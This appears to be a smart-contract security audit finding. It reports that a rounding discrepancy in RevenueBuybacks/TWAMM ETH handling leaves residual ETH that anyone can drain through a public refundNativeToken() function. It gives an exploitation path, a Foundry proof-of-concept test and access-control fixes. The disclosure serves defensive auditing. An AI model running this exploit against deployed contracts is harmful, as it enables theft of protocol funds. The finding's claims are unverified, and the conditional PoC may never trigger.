## Title
ETH Leakage in RevenueBuybacks Due to Rounding Discrepancy and Public Refund Function

## Summary
When `RevenueBuybacks.roll()` sends ETH to create/extend TWAMM orders, a rounding discrepancy between the sent amount and the TWAMM's calculated amount requirement can leave ETH stuck in the Orders contract. This leftover ETH can be stolen by any attacker calling the public `refundNativeToken()` function, causing loss of protocol revenue.

## Impact
**Severity**: Medium

## Finding Description

**Location:** [1](#0-0) 

**Intended Logic:** When `isEth` is true, `RevenueBuybacks.roll()` should send the exact amount of ETH needed to create/extend a TWAMM order, with all ETH being consumed by the order creation process.

**Actual Logic:** Due to ceiling function rounding in TWAMM calculations, the amount of ETH actually needed (`amountDelta`) can be less than the amount sent (`amountToSpend`). The discrepancy occurs because:

1. `amountToSpend` is calculated based on the contract's full ETH balance [2](#0-1) 

2. The Orders contract calculates `saleRate` from this amount [3](#0-2) 

3. The TWAMM extension calculates the actual amount needed by computing:
   - `amountRequired = computeAmountFromSaleRate(saleRateNext, duration, roundUp: true)` [4](#0-3) 
   - `remainingSellAmount = computeAmountFromSaleRate(saleRate, duration, roundUp: true)` [5](#0-4) 
   - `amountDelta = amountRequired - remainingSellAmount` [6](#0-5) 

4. Due to the ceiling function properties in `computeAmountFromSaleRate` [7](#0-6) , where `ceil(a+b) - ceil(a)` can be less than `ceil(b)` by up to 1 wei, `amountDelta` can be less than `amountToSpend`.

5. When `amountDelta < amountToSpend`, the leftover ETH remains in the Orders contract.

6. The Orders contract inherits from `PayableMulticallable`, which exposes a public `refundNativeToken()` function [8](#0-7)  that allows ANYONE to claim the entire ETH balance.

**Exploitation Path:**
1. Attacker monitors the blockchain for `RevenueBuybacks.roll(NATIVE_TOKEN_ADDRESS)` transactions
2. When a transaction leaves residual ETH in the Orders contract due to rounding (even 1 wei)
3. Attacker immediately calls `Orders.refundNativeToken()` in the same block or subsequent block
4. The full ETH balance of Orders contract is transferred to the attacker

**Security Property Broken:** Protocol revenue intended for token buybacks is diverted to attackers, violating the solvency expectation that all protocol funds are properly accounted for and used for their intended purpose.

## Impact Explanation

- **Affected Assets**: ETH revenue collected by the RevenueBuybacks contract for protocol buybacks
- **Damage Severity**: Up to 1 wei of ETH per order extension can be stolen. While individually small, this accumulates over time as `roll()` is called repeatedly. More critically, if multiple users use the Orders contract and leave residual ETH, larger amounts can accumulate and be stolen.
- **User Impact**: The protocol loses revenue that should have been used to buy back tokens. While the immediate per-transaction loss is small (typically 1 wei), the vulnerability represents a systemic leak of protocol funds.

## Likelihood Explanation

- **Attacker Profile**: Any external actor can exploit this - no special permissions or capital required
- **Preconditions**: 
  - RevenueBuybacks is configured for ETH buybacks
  - `roll()` is called to extend existing orders (more likely to trigger rounding discrepancy)
  - The mathematical conditions for rounding discrepancy are met (fractional parts of sale rate calculations sum to less than 1)
- **Execution Complexity**: Single transaction calling `Orders.refundNativeToken()` - trivial to execute
- **Frequency**: Can occur on every order extension where rounding causes a discrepancy. The mathematical certainty of ceiling function behavior means this WILL occur given sufficient transactions.

## Recommendation

Remove or restrict the `refundNativeToken()` function in the Orders contract context, or implement a withdrawal mechanism that only allows authorized parties to claim residual funds:

```solidity
// Option 1: Remove refundNativeToken from Orders by not inheriting PayableMulticallable
// This is the simplest fix but may break other functionality

// Option 2: Override refundNativeToken with access control
function refundNativeToken() external payable override {
    // Only allow the contract owner or specific authorized addresses
    if (msg.sender != owner()) revert Unauthorized();
    if (address(this).balance != 0) {
        SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
    }
}

// Option 3: Fix the rounding issue by adjusting the amount sent
// In RevenueBuybacks.roll(), calculate the exact amount needed before sending:
// This requires a view function to preview the required amount, which may not be feasible
// given the lock-based architecture
```

The recommended approach is **Option 2**: Override `refundNativeToken()` with access control to prevent unauthorized draining while still allowing recovery of stuck funds by authorized parties.

## Proof of Concept

```solidity
// File: test/Exploit_ETHLeakage.t.sol
// Run with: forge test --match-test test_ETHLeakage -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/RevenueBuybacks.sol";
import "../src/Orders.sol";
import "../src/Core.sol";
import "../src/extensions/TWAMM.sol";

contract Exploit_ETHLeakage is Test {
    RevenueBuybacks buybacks;
    Orders orders;
    Core core;
    TWAMM twamm;
    address attacker;
    
    function setUp() public {
        // Deploy protocol contracts
        core = new Core(address(this));
        twamm = new TWAMM(core);
        orders = new Orders(core, twamm, address(this));
        
        // Deploy RevenueBuybacks with ETH as buy token
        address buyToken = address(0x123); // Some token to buy
        buybacks = new RevenueBuybacks(address(this), orders, buyToken);
        
        // Configure buyback parameters for native ETH
        buybacks.configure(
            address(0), // NATIVE_TOKEN_ADDRESS
            3600,       // targetOrderDuration (1 hour)
            1800,       // minOrderDuration (30 min)
            3000        // fee (0.3%)
        );
        
        attacker = address(0x999);
    }
    
    function test_ETHLeakage() public {
        // SETUP: Send ETH to RevenueBuybacks
        vm.deal(address(buybacks), 1 ether);
        
        // First roll() call creates initial order
        buybacks.roll(address(0));
        
        // Simulate time passing (but not enough to expire the order)
        vm.warp(block.timestamp + 900); // 15 minutes
        
        // Send more ETH for extension
        vm.deal(address(buybacks), 1 ether);
        
        // Second roll() extends the order
        // Due to rounding, this may leave residual ETH in Orders contract
        uint256 ordersBefore = address(orders).balance;
        buybacks.roll(address(0));
        uint256 ordersAfter = address(orders).balance;
        
        // EXPLOIT: If any ETH remains in Orders, attacker steals it
        if (ordersAfter > ordersBefore) {
            vm.prank(attacker);
            orders.refundNativeToken();
            
            // VERIFY: Attacker received the ETH
            assertGt(
                address(attacker).balance,
                0,
                "Attacker successfully stole residual ETH from Orders contract"
            );
        }
    }
}
```

## Notes

While the security question asked about "incorrect isEth evaluation," the actual vulnerability discovered is in the ETH handling logic downstream of that evaluation. The `isEth` boolean itself is correctly evaluated [9](#0-8) , but the combination of:
1. Rounding discrepancies in TWAMM amount calculations
2. The public `refundNativeToken()` function accessible to anyone

Creates a vulnerability where protocol ETH revenue can be stolen. This represents a broader issue with the ETH handling in the `roll()` function than just the `isEth` evaluation itself.

### Citations

**File:** src/RevenueBuybacks.sol (L102-103)
```text
            bool isEth = token == NATIVE_TOKEN_ADDRESS;
            uint256 amountToSpend = isEth ? address(this).balance : SafeTransferLib.balanceOf(token, address(this));
```

**File:** src/RevenueBuybacks.sol (L133-136)
```text
            if (amountToSpend != 0) {
                saleRate = ORDERS.increaseSellAmount{value: isEth ? amountToSpend : 0}(
                    NFT_ID, _createOrderKey(token, state.fee(), 0, endTime), uint128(amountToSpend), type(uint112).max
                );
```

**File:** src/Orders.sol (L66-66)
```text
            saleRate = uint112(computeSaleRate(amount, uint32(orderKey.config.endTime() - realStart)));
```

**File:** src/extensions/TWAMM.sol (L305-306)
```text
                uint256 amountRequired =
                    computeAmountFromSaleRate({saleRate: saleRateNext, duration: durationRemaining, roundUp: true});
```

**File:** src/extensions/TWAMM.sol (L311-312)
```text
                uint256 remainingSellAmount =
                    computeAmountFromSaleRate({saleRate: saleRate, duration: durationRemaining, roundUp: true});
```

**File:** src/extensions/TWAMM.sol (L314-316)
```text
                assembly ("memory-safe") {
                    amountDelta := sub(amountRequired, remainingSellAmount)
                }
```

**File:** src/math/twamm.sol (L42-45)
```text
function computeAmountFromSaleRate(uint256 saleRate, uint256 duration, bool roundUp) pure returns (uint256 amount) {
    assembly ("memory-safe") {
        amount := shr(32, add(mul(saleRate, duration), mul(0xffffffff, roundUp)))
    }
```

**File:** src/base/PayableMulticallable.sol (L25-29)
```text
    function refundNativeToken() external payable {
        if (address(this).balance != 0) {
            SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
        }
    }
```
